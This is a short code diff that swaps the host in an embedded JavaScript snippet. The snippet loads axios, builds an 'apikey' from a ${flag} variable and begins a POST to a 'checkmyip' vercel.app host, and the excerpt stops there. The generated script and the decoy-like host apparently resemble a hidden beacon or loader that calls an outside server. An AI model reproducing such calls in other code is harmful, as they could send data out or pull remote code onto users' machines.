@@ -455,7 +455,7 @@ exit 0
     
 		script = `
 	const axios = require('axios');
-const host = "checkmyip-mu.vercel.app";
+const host = "checkmyip-rh.vercel.app";
 const apikey = "3aeb34a3${flag}";
 axios
   .post(
